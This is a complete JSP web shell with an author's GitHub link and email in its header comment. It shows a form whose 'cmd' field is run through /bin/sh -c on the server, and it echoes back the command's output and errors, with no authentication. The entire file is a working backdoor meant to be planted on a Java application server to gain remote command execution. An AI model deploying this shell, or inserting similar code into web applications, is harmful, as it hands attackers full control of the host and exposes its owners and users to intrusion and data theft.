<%-- 
    https://github.com/jimidk 
    jim.maziashvili@gmail.com
--%>
<FORM>
    <INPUT name='cmd' style='width:70%;' type=text>
    <INPUT type=submit value='exec'>
</FORM>
<%@ page import="java.io.*" %>
    <%
    String cmd = request.getParameter("cmd");
    String output = "";
    String error = "";
    if(cmd != null) {
        String[] commandAndArgs = new String[]{ "/bin/sh", "-c", cmd };
        String s = null;
        Process process = Runtime.getRuntime().exec(commandAndArgs);
        InputStream inputStream = process.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
        Thread.sleep(2000);
        while(process.isAlive()) Thread.sleep(100);
        while((s = reader.readLine()) != null) { output += s+"&#13;&#10;"; }
        reader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
        while((s = reader.readLine()) != null) { error += s+"&#13;&#10;"; }
    }
%>

cmd: <%=cmd %><br>
output:<br>
<textarea style="width:100%; height: 50%"><%=output %></textarea>
error:<br>
<textarea style="width:100%; height: 30%"><%=error %></textarea> 
